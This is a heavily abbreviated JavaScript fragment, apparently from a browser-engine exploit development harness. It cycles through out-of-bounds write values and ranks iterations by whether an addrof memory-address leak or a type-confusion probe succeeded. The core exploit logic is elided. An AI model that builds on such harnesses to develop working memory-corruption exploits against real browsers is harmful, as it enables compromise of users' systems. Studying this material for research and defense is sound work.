...
export async function executeTypedArrayVictimAddrofTest_AdvancedGetterLeak_R20() { 
    ...
    let best_result_for_runner = {
        errorOccurred: null, 
        tc_probe_details: null, // Renomeado para refletir que são os detalhes da sonda da Fase 1
    ...
    for (const current_oob_value of OOB_WRITE_VALUES_V82) {
        ...
        try { 
            // Fase 1 e Fase 2 (lógica como na R19, apenas adaptando nomes de log/variáveis para R20 se necessário)
            // ... (O corpo desta função é substancialmente o mesmo da R19, apenas os logs e nomes de funções chamadas são R20)
        ...
        let addrof_phase2_this_iter_success = iter_addrof_core_result.success;

        // Prioridade 1: Addrof da Fase 2 funcionou
        if (addrof_phase2_this_iter_success) {
            if (!best_result_for_runner.addrof_A_result_core_func.success) { // Pega o primeiro addrof da Fase 2
                best_result_for_runner = { ...current_iter_summary }; // Usa todos os dados desta iteração
            }
        } 
        // Prioridade 2: TC da Fase 1 funcionou (e Fase 2 não teve sucesso ainda no best_result)
        else if (tc_phase1_this_iter_success && !best_result_for_runner.addrof_A_result_core_func.success) {
        ...
        // Prioridade 3: Se nenhuma iteração teve sucesso até agora, usa a última.
    ...
    return { 
        ...
        heisenbug_on_M2_in_best_result:best_result_for_runner.heisenbug_on_M2_confirmed_by_tc_probe // Nome correto aqui
    };
}
